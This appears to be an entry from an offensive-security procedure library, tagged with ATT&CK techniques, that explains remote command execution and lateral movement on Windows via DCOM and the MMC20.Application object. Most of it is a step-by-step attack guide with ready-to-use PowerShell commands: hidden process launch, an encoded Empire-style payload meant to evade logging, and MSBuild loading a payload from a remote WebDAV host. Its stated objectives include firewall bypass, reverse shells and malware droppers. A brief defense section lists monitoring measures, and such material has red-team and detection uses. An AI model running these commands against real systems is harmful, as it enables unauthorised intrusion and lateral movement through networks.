---
id: 9932dd71-57f9-41ae-b29e-e0e35173aff0
name: DCOM-Shell-Command-Execution-via-MMC-Application-Class
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:07.099342+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[sub-techniques/Windows Admin Shares|T1021.002 - SMB/Windows Admin Shares]]'
  - '[[sub-techniques/PowerShell|T1059.001 - PowerShell]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/DCOM Exploitation]]'
  - '[[tags/DCOM via MMC Application Class]]'
commands:
  - '[[commands/powershell-create-mmc20-com-instance]]'
  - '[[commands/powershell-execute-shell-command-via-mmc]]'
  - '[[commands/powershell-execute-msbuild-via-mmc-remote]]'
platforms:
  - Windows
tools: []
validated: true
---

# DCOM-Shell-Command-Execution-via-MMC-Application-Class

## Summary

This procedure demonstrates how to execute shell commands on a remote Windows system using the MMC20.Application COM object via DCOM. By creating a remote instance of the MMC Application Class and invoking its ExecuteShellCommand method, an attacker with administrative access can run arbitrary commands, such as launching executables or PowerShell scripts, to achieve remote code execution. This bypasses some traditional remote access restrictions and can be used for lateral movement or persistence in Active Directory environments.

## Description

DCOM (Distributed Component Object Model) allows remote instantiation and execution of COM objects on Windows systems. The MMC20.Application object, part of the Microsoft Management Console framework, exposes an ExecuteShellCommand method that can launch processes on the remote machine with the privileges of the connecting user. This technique requires the attacker to have administrative credentials or access to the target and involves connecting to the remote system's MMC service over DCOM (typically port 135 and dynamic RPC ports). It is particularly effective in domain environments where firewalls may allow DCOM traffic between trusted hosts. Successful execution grants the ability to run commands like calculator for testing, encoded PowerShell payloads for further exploitation, or tools like MSBuild to load remote payloads from WebDAV shares. Detection can be challenging as it mimics legitimate administrative activities, but monitoring for unusual MMC snap-in creations or DCOM invocations can help identify abuse.

## Requirements

1. Administrative credentials or access to the target Windows system (domain admin preferred for cross-machine execution).
2. Network connectivity to the target over DCOM ports (TCP 135 and high-range RPC ports 49152-65535).
3. PowerShell execution policy allowing script execution on the attacker's machine.
4. Knowledge of the target's IP address and basic Windows path structures (e.g., C:\Windows\System32).

## Defense

- Disable or restrict DCOM access using Windows Firewall rules or Group Policy to block unnecessary RPC endpoints.
- Monitor for anomalous DCOM calls via Event ID 10036 (DCOM errors) or Sysmon logs for MMC20.Application instantiations.
- Implement least privilege principles to limit admin access and use Just-In-Time (JIT) elevation.
- Enable PowerShell logging (Module, ScriptBlock, and Transcription) to capture executed commands.
- Scan for and restrict creation of custom MMC snap-ins on endpoints.

## Objectives

1. Achieve remote code execution on a target Windows machine via DCOM without relying on SMB or WMI.
2. Bypass firewalls that block common remote execution vectors like PsExec or WinRM.
3. Establish persistence or lateral movement by executing payloads like reverse shells or malware droppers.
4. Maintain operational security by using built-in Windows components to reduce footprint.

## Instructions

### Step 1: Create Remote MMC20.Application COM Instance

**Context**: Instantiate the MMC20.Application COM object on the remote target to establish a DCOM connection. This step prepares the object for command execution and requires specifying the target's IP address.

**Command** ([[commands/powershell-create-mmc20-com-instance]]):
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","$_TARGET_IP"))
```

This command creates a remote COM object reference. Replace $_TARGET_IP with the target's IP (e.g., 10.10.10.1). Expected output is no error; the $com variable holds the object reference, verifiable by checking if $com is not null.

### Step 2: Execute Basic Shell Command

**Context**: Use the instantiated COM object to run a simple executable like calc.exe on the remote system. This tests the connection and confirms execution privileges. The WindowStyle parameter (7) hides the window.

**Command** ([[commands/powershell-execute-shell-command-via-mmc]]):
```powershell
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $null, $null, 7)
```

This launches calc.exe hidden on the target. Expected output is no error from PowerShell; verify by observing the calculator process on the target via Task Manager or by checking for process creation events.

### Step 3: Execute Encoded PowerShell Payload

**Context**: Run an encoded PowerShell command to deliver a payload, such as an Empire agent. Encoding obfuscates the command to evade basic logging. This step demonstrates payload delivery for further exploitation.

**Command** ([[commands/powershell-execute-shell-command-via-mmc]]):
```powershell
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", $null, "-enc $_ENCODED_PAYLOAD", "7")
```

Replace $_ENCODED_PAYLOAD with a base64-encoded string (e.g., from Empire's 'powershell' stager). Expected output is successful execution without errors; verify by checking for the payload's effects, like a new process or network callback.

### Step 4: Execute Remote Payload via MSBuild

**Context**: Load and execute a remote XML-based payload using MSBuild over WebDAV. This is useful for sideloading .NET assemblies or running inline tasks without dropping files locally. It combines DCOM with file share access.

**Command** ([[commands/powershell-execute-msbuild-via-mmc-remote]]):
```powershell
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","$_TARGET_IP")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe", $null, "$_REMOTEPATH", "7")
```

Replace $_TARGET_IP with the target IP and $_REMOTEPATH with the WebDAV path (e.g., \\10.10.10.2\webdav\build.xml). Expected output is no error; verify by observing MSBuild process spawning and any payload effects like file creation or network activity.

### Step 5: Verify and Clean Up

**Context**: Confirm execution success and release the COM object to avoid lingering connections. This step includes checking remote process lists or logs.

Use built-in PowerShell remoting or another tool to query running processes on the target (e.g., Get-Process via Invoke-Command if WinRM is available). Then release: $com = $null. Expected output: Confirmation of executed processes; no dangling DCOM sessions in netstat.
